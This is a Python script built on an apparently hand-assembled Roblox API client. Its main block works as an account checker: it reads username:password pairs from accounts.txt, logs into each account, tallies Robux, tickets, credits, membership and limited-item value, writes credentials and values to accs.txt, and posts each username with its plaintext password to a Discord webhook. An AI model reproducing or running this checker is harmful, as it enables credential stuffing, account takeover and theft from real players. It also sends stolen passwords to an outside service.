import json, requests, datetime, time, random, re, threading, pickle, os, sys, glob, colorama, getpass, bs4, shutil
from threading import Thread
from bs4 import BeautifulSoup
from utils import *
from pprint import pprint
from colorama import Fore
from colorama import Style
from collections import defaultdict

# https://github.com/kyb3r/dhooks
class dhooks:
	class Webhook:
		def __init__(self, url, **kwargs):
			"""
			Initialise a Webhook Embed Object
			"""
			self.url = url 
			self.msg = kwargs.get('msg')
			self.color = kwargs.get('color')
			self.title = kwargs.get('title')
			self.title_url = kwargs.get('title_url')
			self.author = kwargs.get('author')
			self.author_icon = kwargs.get('author_icon')
			self.author_url = kwargs.get('author_url')
			self.desc = kwargs.get('desc')
			self.fields = kwargs.get('fields', [])
			self.image = kwargs.get('image')
			self.thumbnail = kwargs.get('thumbnail')
			self.footer = kwargs.get('footer')
			self.footer_icon = kwargs.get('footer_icon')
			self.ts = kwargs.get('ts')

		def add_field(self,**kwargs):
			'''Adds a field to `self.fields`'''
			name = kwargs.get('name')
			value = kwargs.get('value')
			inline = kwargs.get('inline', True)

			field = { 

			'name' : name,
			'value' : value,
			'inline' : inline

			}

			self.fields.append(field)

		def set_desc(self,desc):
			self.desc = desc

		def set_author(self, **kwargs):
			self.author = kwargs.get('name')
			self.author_icon = kwargs.get('icon')
			self.author_url = kwargs.get('url')

		def set_title(self, **kwargs):
			self.title = kwargs.get('title')
			self.title_url = kwargs.get('url')

		def set_thumbnail(self, url):
			self.thumbnail = url

		def set_image(self, url):
			self.image = url

		def set_footer(self,**kwargs):
			self.footer = kwargs.get('text')
			self.footer_icon = kwargs.get('icon')
			ts = kwargs.get('ts')
			if ts == True:
				self.ts = str(datetime.datetime.utcfromtimestamp(time.time()))
			else:
				self.ts = str(datetime.datetime.utcfromtimestamp(ts))

		def del_field(self, index):
			self.fields.pop(index)

		@property
		def json(self,*arg):
			'''
			Formats the data into a payload
			'''

			data = {}

			data["embeds"] = []
			embed = defaultdict(dict)
			if self.msg: data["content"] = self.msg
			if self.author: embed["author"]["name"] = self.author
			if self.author_icon: embed["author"]["icon_url"] = self.author_icon
			if self.author_url: embed["author"]["url"] = self.author_url
			if self.color: embed["color"] = self.color 
			if self.desc: embed["description"] = self.desc 
			if self.title: embed["title"] = self.title 
			if self.title_url: embed["url"] = self.title_url 
			if self.image: embed["image"]['url'] = self.image
			if self.thumbnail: embed["thumbnail"]['url'] = self.thumbnail
			if self.footer: embed["footer"]['text'] = self.footer
			if self.footer_icon: embed['footer']['icon_url'] = self.footer_icon
			if self.ts: embed["timestamp"] = self.ts 

			if self.fields:
				embed["fields"] = []
				for field in self.fields:
					f = {}
					f["name"] = field['name']
					f["value"] = field['value']
					f["inline"] = field['inline'] 
					embed["fields"].append(f)

			data["embeds"].append(dict(embed))

			empty = all(not d for d in data["embeds"])

			if empty and 'content' not in data:
				print('You cant post an empty payload.')
			if empty: data['embeds'] = []

			return json.dumps(data, indent=4)

		def post(self):
			"""
			Send the JSON formated object to the specified `self.url`.
			"""

			headers = {'Content-Type': 'application/json'}

			result = requests.post(self.url, data=self.json, headers=headers)

			if result.status_code == 400:
				print("Webhook Post Failed, Error 400")
			else:
				print("")
			time.sleep(1)

class Gear(object):
	def __init__(self):
		self.MELEE = 0
		self.RANGED = 1
		self.EXPLOSIVE = 2
		self.POWERUP = 3
		self.NAVIGATION = 4
		self.MUSICAL = 5
		self.SOCIAL = 6
class Subcategory(object):
	def __init__(self):
		self.FEATURED = 0
		self.ALL = 1
		self.COLLECTIBLES = 2
		self.CLOTHING = 3
		self.BODYPARTS = 4
		self.GEAR = 5
		self.MODELS = 6
		self.PLUGINS = 7
		self.DECALS = 8
		self.HATS = 9
		self.FACES = 10
		self.PACKAGES = 11
		self.SHIRTS = 12
		self.TSHIRTS = 13
		self.PANTS = 14
		self.HEADS = 15
		self.AUDIO = 16
		self.ROBLOXCREATED = 17
		self.MESHES = 18
class Genre(object):
	def __init__(self):
		self.ALL = 0
		self.TOWNANDCITY = 1
		self.MEDIEVAL = 2
		self.SCIFI = 3
		self.FIGHTING = 4
		self.HORROR = 5
		self.NAVAL = 6
		self.ADVENTURE = 7
		self.SPORTS = 8
		self.COMEDY = 9
		self.WESTERN = 10
		self.MILITARY = 11
		self.SKATING = 12
		self.BUILDING = 13
		self.FPS = 14
		self.RPG = 15
class Category(object):
	def __init__(self):
		self.FEATURED = 0
		self.ALL = 1
		self.COLLECTIBLES = 2
		self.CLOTHING = 3
		self.BODYPARTS = 4
		self.GEAR = 5
		self.MODELS = 6
		self.PLUGINS = 7
		self.DECALS = 8
		self.AUDIO = 9
		self.MESHES = 10
class Currency(object):
	def __init__(self):
		self.ALL = 0
		self.ROBUX = 1
		self.FREE = 2
class Sort(object):
	def __init__(self):
		self.RELEVANCE = 0
		self.MOSTFAVORITED = 1
		self.BESTSELLING = 2
		self.RECENTLYUPDATED = 3
		self.PRICELOWTOHIGH = 4
		self.PRICEHIGHTOLOW = 5
class Time(object):
	def __init__(self):
		self.PASTDAY = 0
		self.PASTWEEK = 1
		self.PASTMONTH = 2
		self.ALLTIME = 3

class RobloxApiClient(object):
	def __init__(self):
		self.s = requests.session()
		self.token = None
		
	# these made by Saorax
	def doesUserExist(self,usr):
		r = self.s.get('https://web.roblox.com/UserCheck/DoesUsernameExist?username='+usr)
		jdict = json.loads(r.text)
		if jdict["success"] == False:
			return False
		else:
			return True
		
	def getId(self,usr):
		r = self.s.get('https://api.roblox.com/users/get-by-username?username='+usr)
		jdict = json.loads(r.text)
		return jdict["Id"]
		
	def getVerified(self,uid):
		r = self.s.get('https://api.roblox.com/ownership/hasasset?userId={}&assetId=102611803'.format(uid))
		jdict = json.loads(r.text)
		if jdict == 'true':
			return 'No'
		else:
			return 'Yes'
	
	def getMembership(self,uid):
		r = self.s.get('https://www.roblox.com/profile?userId='+uid)
		jdict = json.loads(r.text)
		if jdict['BC'] == True:
			return 'BC'
		elif jdict['TBC'] == True:
			return 'TBC'
		elif jdict['OBC'] == True:
			return 'OBC'
		else:
			return 'NBC'
	
	def mobileApi(self):
		r = self.s.get('https://www.roblox.com/mobileapi/userinfo')
		jdict = json.loads(r.text)
		return print(jdict)
		
	def getThumnbail(self):
		r = self.s.get('https://www.roblox.com/mobileapi/userinfo')
		jdict = json.loads(r.text)
		return jdict['ThumbnailUrl']
		
	def getRobux(self):
		r = self.s.get('https://www.roblox.com/mobileapi/userinfo')
		jdict = json.loads(r.text)
		return jdict['RobuxBalance']
	
	def getTix(self):
		r = self.s.get('https://www.roblox.com/mobileapi/userinfo')
		jdict = json.loads(r.text)
		return jdict['TicketsBalance']
		
	def getCredits(self):
		r = self.s.get('https://web.roblox.com/gamecards/redeem/userdata')
		jdict = json.loads(r.text)
		return jdict['CreditBalance']
	
	# rest made by thernizam
	def friends(self,id1,id2):
		t = self.s.get('https://www.roblox.com/Game/LuaWebService/HandleSocialRequest.ashx?method=IsFriendsWith&playerId='+id1+'&userId='+id2).text
		t=t.replace('<Value Type="boolean">','')
		t=t.replace('</Value>','')
		if t == 'true':
			return True
		else:
			return False
	
	def name(self,iyd):
		r = self.s.get('https://api.roblox.com/Users/'+iyd)
		jdict = json.loads(r.text)
		return jdict["Username"]

	def assetComments(self,id1):
		r = self.s.get('https://www.roblox.com/API/Comments.ashx?rqtype=getComments&assetID='+id1+'&startIndex=0')
		js = json.loads(r.text)
		return js

	def catalogSearch(self,geartype = -1, genre = -1, subcategory = -1, category = -1, currency = -1, sort = -1, freq = -1, keyword = None, creatorID = None, minim = 0, maxim = None, notforsale = True, pagenumber = -1, resultsperpage = -1, url = False):
		req = 'http://roblox.com/catalog/json?'
		if geartype != -1:
			req += '&Gears={}'.format(geartype)
		if genre != -1:
			req += '&Genres={}'.format(genre)
		if subcategory != -1:
			req += '&Subcategory={}'.format(subcategory)
		if category != -1:
			req += '&Category={}'.format(category)
		if currency != -1:
			req += '&CurrencyType={}'.format(currency)
		if sort != -1:
			req += '&SortType={}'.format(sort)
		if freq != -1:
			req += '&AggregationFrequency={}'.format(freq)
		if keyword != None:
			req += '&Keyword={}'.format(keyword)
		if creatorID != None:
			req += '&CreatorID={}'.format(creatorID)
		req += '&PxMin={}'.format(minim)
		if maxim != None:
			req += '&PxMax={}'.format(maxim)
		if notforsale:
			req += '&IncludeNotForSale=true'
		else:
			req += '&IncludeNotForSale=false'
		if pagenumber != -1:
			req +=  '&PageNumber={}'.format(pagenumber)
		if resultsperpage != -1:
			req += '&ResultsPerPage={}'.format(resultsperpage)
		r = self.s.get(req)
		if url:
			print(r.url)
		return json.loads(r.text)
	
	def getFriends(self,userid):
		return self.s.get('https://api.roblox.com/users/'+str(userid)+'/friends').json()

	def friendCrawl(self,userid, maxfr = 100):
		usercount = 0
		users = []
		friendlist1 = getFriends(userid)
		for friend in friendlist1:
			if len(users) < maxfr:
				if self.s.get('https://www.roblox.com/users/'+str(friend['Id'])+'/profile').status_code != 404:
					users.append({'Id':friend['Id'],'Username':friend['Username']})
					usercount += 1
					print("Users: "+ str(usercount))
			else:
				return users
		for user in users:
			req = self.s.get("https://api.roblox.com/users/"+str(user['Id'])+"/friends")
			if req.status_code != 404:
				friendlist1 = json.loads(req.text)
			else:
				pass
			for friend in friendlist1:
				if len(users) < maxfr:
					if self.s.get('https://www.roblox.com/users/'+str(friend['Id'])+'/profile').status_code != 404:
						d = {'Id':friend['Id'],'Username':friend['Username']}
						if d not in users:
							users.append(d)
							usercount += 1
							print("Users: "+ str(usercount))
				else:
					return users

	def getCurrentStatus(self):
		return self.s.get('https://www.roblox.com/client-status').text

	def getUserPresence(self,userid):
		return self.s.get('https://www.roblox.com/presence/user?userId={}'.format(userid)).json()

	def createAccount(self,username,password,birthday,gender = 2): #birthday is a datetime object
		params = {
			"isEligibleForHideAdsAbTest":False,
			"username":username,
			"password":password,
			"birthday": birthday.strftime("%d %b %Y").lstrip("0").replace(" 0", " "),
			"gender": gender, #3 for female, 2 for male
			"context":"RollerCoasterSignupForm"
		}
		r = self.s.post("https://api.roblox.com/signup/v1",data = params)
		return r

	def getItemInfo(self,itemid):
		return self.s.get("https://api.roblox.com/marketplace/productinfo?assetId="+str(itemid)).json()

	def buyItem(self,itemid):
		info = self.getItemInfo(itemid)
		url="https://web.roblox.com/api/item.ashx?rqtype=purchase&productID={}&expectedCurrency=1&expectedPrice={}&expectedSellerID={}&userAssetID=".format(info["ProductId"], 0 if info["PriceInRobux"] == None else info["PriceInRobux"],info["Creator"]["Id"])
		self.token = self.s.post(url).headers['X-CSRF-TOKEN']
		r = self.s.post(url, headers = {"X-CSRF-TOKEN":self.token})
		return r

	def logIn(self,username,password,returnurl = ""):
		r = self.s.post("https://www.roblox.com/newlogin",data={"username":username,"password":password,"submitLogin":"Log In","ReturnUrl":returnurl})
		return r

	def giveBadge(self,userid,badgeid,placeid):
		return self.s.post("https://api.roblox.com/assets/award-badge", data = {'userId':userid,'badgeId':badgeid,'placeId':placeid}).json()

	def getVersions(self,itemid):
		return self.s.get("https://api.roblox.com/assets/{}/versions".format(itemid)).json()

	def getCurrency(self):
		return self.s.get("https://api.roblox.com/currency/balance").json()

	def setXsrfToken(self):
		r = self.s.get("https://roblox.com/home")
		tok = r.text[r.text.find("Roblox.XsrfToken.setToken('") + 27::]
		tok = tok[:tok.find("');"):]
		self.token = tok
		return tok

	def sendMessage(self,subject,body,recipientid):
		if not self.token:
			self.setXsrfToken()
		r = self.s.post('https://www.roblox.com/messages/send',headers = {'Content-Type':"application/x-www-form-urlencoded; charset=UTF-8","X-CSRF-TOKEN":self.token}, data = {"subject":subject,"body":body,"recipientid":recipientid,"cacheBuster":round(time.time(),3)})
		return r

	def forumPost(self,forumid,subject,body,disablereplies = False): #currently nonfunctional
		earl = "https://forum.roblox.com/Forum/AddPost.aspx?ForumID={}".format(forumid)
		view = self.s.get(earl)
		soup = BeautifulSoup(view.text,'html.parser')
		params = {
			"__EVENTTARGET" : '',
			"__EVENTARGUMENT": '',
			'__VIEWSTATE':soup.find(id="__VIEWSTATE")['value'],
			"__VIEWSTATEGENERATOR":soup.find(id="__VIEWSTATEGENERATOR")['value'],
			"__EVENTVALIDATION" : soup.find(id="__EVENTVALIDATION")['value'],
			"ctl00$cphRoblox$Createeditpost1$PostForm$NewPostSubject":subject,
			"ctl00$cphRoblox$Createeditpost1$PostForm$PostBody":body,
			"ctl00$cphRoblox$Createeditpost1$PostForm$PostButton":" Post "
		}
		if disablereplies:
			params["ctl00$cphRoblox$Createeditpost1$PostForm$AllowReplies"] = 'on'
		r = self.s.post(earl, data = params, headers = {"Content-Type":"application/x-www-form-urlencoded"})
		return r

	def replyToForumPost(self, postid, text, disablereplies = False):
		earl = "https://forum.roblox.com/Forum/AddPost.aspx?PostID={}".format(postid)
		view = self.s.get(earl)
		soup = BeautifulSoup(view.text,'html.parser')
		params = {
			"__EVENTTARGET" : '',
			"__EVENTARGUMENT": '',
			'__VIEWSTATE':soup.find(id="__VIEWSTATE")['value'],
			"__VIEWSTATEGENERATOR":soup.find(id="__VIEWSTATEGENERATOR")['value'],
			"__EVENTVALIDATION" : soup.find(id="__EVENTVALIDATION")['value'],
			"ctl00$cphRoblox$Createeditpost1$PostForm$PostBody":text,
			"ctl00$cphRoblox$Createeditpost1$PostForm$PostButton":" Post "
		}
		if disablereplies:
			params["ctl00$cphRoblox$Createeditpost1$PostForm$AllowReplies"] = 'on'
		r = self.s.post(earl, data = params, headers = {"Content-Type":"application/x-www-form-urlencoded"})
		return r

	def getRobloSecurityCookie(self):
		return self.s.cookies.get_dict()['.ROBLOSECURITY']

	def commentOnAsset(self,assetid,text):
		if not self.token:
			self.setXsrfToken()
		r = self.s.post("https://www.roblox.com/comments/post",data = {'assetId':assetid,'text':text}, headers = {"X-CSRF-TOKEN":self.token})
		return r

	def joinGroup(self,groupid):
		viewpage = self.s.get("https://www.roblox.com/groups/group.aspx?gid={}".format(groupid))
		soup = BeautifulSoup(viewpage.text,'html.parser')
		params = {
		'__EVENTTARGET':"JoinGroupDiv",
		'__EVENTARGUMENT':"Click",
		'__LASTFOCUS':'',
		'__VIEWSTATE':soup.find(id="__VIEWSTATE")['value'],
		'__VIEWSTATEGENERATOR':soup.find(id="__VIEWSTATEGENERATOR")['value'],
		'__EVENTVALIDATION':soup.find(id="__EVENTVALIDATION")['value'],
		'ctl00$cphRoblox$GroupSearchBar$SearchKeyword':"Search all groups",
		'ctl00$cphRoblox$rbxGroupRoleSetMembersPane$dlRolesetList':soup.find(id="ctl00_cphRoblox_rbxGroupRoleSetMembersPane_dlRolesetList").find(selected="selected")['value'],
		'ctl00$cphRoblox$rbxGroupRoleSetMembersPane$RolesetCountHidden':soup.find(id="ctl00_cphRoblox_rbxGroupRoleSetMembersPane_RolesetCountHidden")['value'],
		'ctl00$cphRoblox$rbxGroupRoleSetMembersPane$dlUsers_Footer$ctl01$PageTextBox':soup.find(id="ctl00_cphRoblox_rbxGroupRoleSetMembersPane_dlUsers_Footer_ctl01_PageTextBox")['value'],
		'ctl00$cphRoblox$rbxGroupRoleSetMembersPane$currentRoleSetID':soup.find(id="ctl00_cphRoblox_rbxGroupRoleSetMembersPane_currentRoleSetID")['value']
		}
		r = self.s.post("https://www.roblox.com/groups/group.aspx?gid={}".format(groupid), data = params, headers = {'Content-Type':'application/x-www-form-urlencoded'})
		return r

	def reportAbuse(self,userid,category,comment):
		view = self.s.get("https://www.roblox.com/abusereport/UserProfile?id={}".format(userid))
		params = {
		'__RequestVerificationToken':re.search('name="__RequestVerificationToken" type="hidden" value="(.+)"',view.text).group(1),
		'ReportCategory':category,
		'Comment':comment,
		'Id':userid,
		'RedirectUrl':'/Login',
		'PartyGuid':'',
		'ConversationId':''
		}
		r = self.s.post("https://www.roblox.com/abusereport/UserProfile?id={}",data=params)
		return r

	def getRAP(self,aid, returnv = None):
		txt = requests.get("https://www.roblox.com/asset/{}/sales-data".format(aid)).json()
		value = txt['data']['AveragePrice']
		if returnv:
			returnv[0] += value
		else:
			return value

	def getUserRAP(self,uid):
		hats = self.s.get("https://www.roblox.com/users/inventory/list-json?assetTypeId=8&cursor=&itemsPerPage=999999&pageNumber=1&userId={}".format(uid)).json()
		gear = self.s.get("https://www.roblox.com/users/inventory/list-json?assetTypeId=19&cursor=&itemsPerPage=999999&pageNumber=1&userId={}".format(uid)).json()
		faces = self.s.get("https://www.roblox.com/users/inventory/list-json?assetTypeId=18&cursor=&itemsPerPage=999999&pageNumber=1&userId={}".format(uid)).json()
		hatlist = []
		gearlist = []
		facelist = []
		if hats['IsValid'] == False:
			return None
		for hat in hats['Data']['Items']:
			try:
				if hat['Product'] and hat['Product']['IsLimited'] or hat['Product']['IsLimitedUnique']:
					hatlist.append(hat['Item']['AssetId'])
			except TypeError as e:
				pass
		for hat in gear['Data']['Items']:
			try:
				if hat['Product'] and hat['Product']['IsLimited'] or hat['Product']['IsLimitedUnique']:
					gearlist.append(hat['Item']['AssetId'])
			except TypeError as e:
				pass
		for hat in faces['Data']['Items']:
			try:
				if hat['Product'] and hat['Product']['IsLimited'] or hat['Product']['IsLimitedUnique']:
					facelist.append(hat['Item']['AssetId'])
			except TypeError as e:
				pass
		threadarr = []
		returnval = [0]
		for item in hatlist+gearlist+facelist:
			threadarr.append(Thread(target=self.getRAP,args=(item,returnval)))
		for thread in threadarr:
			thread.start()
		for thread in threadarr:
			thread.join()
		return returnval[0]

	def getSellers(self,aid):
		return requests.get("https://www.roblox.com/asset/resellers?productId={}&startIndex=0&maxRows=9999999".format(self.getItemInfo(aid)['ProductId'])).json()

	def getSalesData(self,aid):
		return requests.get("https://www.roblox.com/asset/{}/sales-data".format(aid)).json()

	def snipeLimited(self,aid,desiredprice):
		self.token = requests.post("https://web.roblox.com/api/item.ashx?rqtype=purchase&productID={}&expectedCurrency=1&expectedPrice={}&expectedSellerID={}&userAssetID={}").headers['X-CSRF-TOKEN']
		sellers = self.getSellers(aid)
		for seller in sellers['data']['Resellers']:
			if seller['Price'] <= desiredprice:
				return requests.post("https://web.roblox.com/api/item.ashx?rqtype=purchase&productID={}&expectedCurrency=1&expectedPrice={}&expectedSellerID={}&userAssetID={}".format(self.getItemInfo(aid)['ProductId'],seller['Price'],seller['SellerId'],seller['UserAssetId']),headers = {"X-CSRF-TOKEN":self.token})
		return False

	def logOut(self):
		if not self.token:
			self.setXsrfToken()
		r = self.s.post("https://api.roblox.com/sign-out/v1",headers={'X-CSRF-TOKEN':self.token})
		return r

	def favItem(self,itemid) : # made by Vibe
		if not self.token:
			self.setXsrfToken()
		r = self.s.post('https://www.roblox.com/favorite/toggle', data = {'assetid': itemid,'isguest' : 'false'}, headers = {"X-CSRF-TOKEN":self.token})
		return r
	
	def updateStatus(self, message) : # also made by Vibe
		if not self.token:
			self.setXsrfToken()
		r = self.s.post('https://www.roblox.com/home/updatestatus', data = {'status': message}, headers = {"X-CSRF-TOKEN":self.token})
		return r

	def sendVerEmail(self):
		r=self.s.post('https://www.roblox.com/my/account/sendverifyemail')
		return r

	def getLeaderBoard(self,gid):
		git = self.s.get('https://www.roblox.com/--item?id={}'.format(gid))
		text=git.text
		reg = re.search("data-distributor-target-id=\"(.+)\"\s*data-max=\"(.+)\"\s*data-rank-max=\"(.+)\"\s*data-target-type=\"(.+)\"\s*data-time-filter=\"(.+)\"\s*data-player-id=\"(.+)\"\s*data-clan-id=\"(.+).></div>",text)
		if reg:
			data={
			'targetType': reg.group(4),
			'distributorTargetId': reg.group(1),
			'timeFilter': reg.group(5),
			'startIndex': 0,
			'currentRank': 1,
			'previousPoints': - 1,
			'max': reg.group(2),
			'imgWidth': 48,
			'imgHeight': 48,
			'imgFormat': 'PNG'
		  }
			r= requests.get('https://roblox.com/leaderboards/rank/json',params=data)
			return r
		else:
			return None

# do stuff
client = RobloxApiClient()
client.logOut()
accstbh = open('accounts.txt')
accsoutp = open('accs.txt', 'a')
for line in accstbh.readlines():
	line = line.strip().split(':')
	username = line[0]
	password = line[1]
	client.logIn(username, password)
	doesItExist = client.doesUserExist(username)
	if doesItExist == True:
		os.system('cls')
		print(Style.RESET_ALL+Fore.GREEN+'Getting info on '+username+'...'+Style.RESET_ALL)
		# user
		userId = client.getId(username)
		userName = client.name('{}'.format(userId))
		userVerified = client.getVerified(userId)
		# currency
		userRobux = client.getRobux()
		userTix = client.getTix()
		userRap = client.getUserRAP(userId)
		bcType = client.getMembership('{}'.format(userId))
		userCredits = client.getCredits()
		bcColo = 000000
		if bcType == 'BC':
			bcColo = 161772
		elif bcType == 'TBC':
			bcColo = 14051342
		elif bcType  == 'OBC':
			bcColo = 11411224
		else:
			bcColo = 12632256

		# print
		confag = open("config.txt", "r").read()
		if "discord=yes" in confag:
			print(Style.RESET_ALL)
			print('[ = Basic Info = ]')
			print('- Username    | {}'.format(userName))
			print('- ID          | {}'.format(userId))
			print('- Membership  | {}'.format(bcType))
			print('- Profile URL | https://web.roblox.com/users/{}/profile'.format(userId))
			print('- Verified    | {}'.format(userVerified))
			print('\n[ = Currency Info = ]')
			print('- Robux       | R$ {}'.format(userRobux))
			print('- Tix         | T$ {}'.format(userTix))
			print('- RAP         | R$ {}'.format(userRap))
			print('- Credits     | {}'.format(userCredits))
			# send to accs.txt
			accsoutp.write(username+':'+password)
			accsoutp.write('\nID: {}'.format(userId))
			accsoutp.write('\nMembership: {}'.format(bcType))
			accsoutp.write('\nRAP: {}'.format(userRap))
			accsoutp.write('\nVerified: {}'.format(userVerified))
			accsoutp.write('\nCredits: {}'.format(userCredits))
			accsoutp.write('\nRobux: {}'.format(userRobux))
			accsoutp.write('\nTix (cuz y not): {}'.format(userTix))
			accsoutp.write('\n-----------------------\n')
			# send to discord
			url = open('discord.txt', 'r').read()
			embed = dhooks.Webhook(url, color=bcColo)
			embed.set_title(title=userName+'\'s Information')
			embed.add_field(name='Username',value=userName)
			embed.add_field(name='Password',value=password)
			embed.add_field(name='ID',value=userId)
			embed.add_field(name='Membership',value='{}'.format(bcType))
			embed.add_field(name='Robux',value='R${}'.format(userRobux))
			embed.add_field(name='Tix (y not?)',value='T${}'.format(userTix))
			embed.add_field(name='Credits',value='{}'.format(userCredits))
			embed.add_field(name='RAP',value='R${}'.format(userRap))
			embed.add_field(name='Verified',value='{}'.format(userVerified))
			embed.post()
			client.logOut()
		else:
			print(Style.RESET_ALL)
			print('[ = Basic Info = ]')
			print('- Username    | {}'.format(userName))
			print('- ID          | {}'.format(userId))
			print('- Membership  | {}'.format(bcType))
			print('- Profile URL | https://web.roblox.com/users/{}/profile'.format(userId))
			print('- Verified    | {}'.format(userVerified))
			print('\n[ = Currency Info = ]')
			print('- Robux       | R$ {}'.format(userRobux))
			print('- Tix         | T$ {}'.format(userTix))
			print('- RAP         | R$ {}'.format(userRap))
			print('- Credits     | {}'.format(userCredits))
			# send to accs.txt
			accsoutp.write(username+':'+password)
			accsoutp.write('\nID: {}'.format(userId))
			accsoutp.write('\nMembership: {}'.format(bcType))
			accsoutp.write('\nRAP: {}'.format(userRap))
			accsoutp.write('\nVerified: {}'.format(userVerified))
			accsoutp.write('\nCredits: {}'.format(userCredits))
			accsoutp.write('\nRobux: {}'.format(userRobux))
			accsoutp.write('\nTix (cuz y not): {}'.format(userTix))
			accsoutp.write('\n-----------------------\n')
			client.logOut()
	else:
		print(Style.RESET_ALL+Fore.RED+username+' isn\'t a user')

client.logOut()
accstbh.close()
accsoutp.close()